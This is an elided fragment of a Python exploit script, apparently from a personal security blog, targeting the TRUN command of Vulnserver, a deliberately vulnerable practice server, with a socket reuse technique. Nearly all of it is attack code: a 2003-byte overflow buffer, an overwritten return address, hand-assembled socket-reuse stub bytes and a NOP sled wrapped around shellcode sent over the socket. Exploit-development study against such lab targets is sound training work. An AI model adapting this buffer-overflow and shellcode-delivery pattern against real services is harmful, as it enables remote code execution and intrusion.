...
# Website: xavibel.com
# Date: 24/06/2019
# Vulnserver TRUN - socket reuse technique
import socket
import os
import sys
import time
...
socket_reuse += "\x66\x83\xC2\x38"          # ADD DX, 38
socket_reuse += "\x52"                      # PUSH EDX
...
crash = "A" * 2003 + "\xAF\x11\x50\x62" + socket_reuse #+ "C" * 2803
...
expl.send("\x90" * 105 + shellcode + "\x90" * 56)
#expl.send("\xCC" * 500)
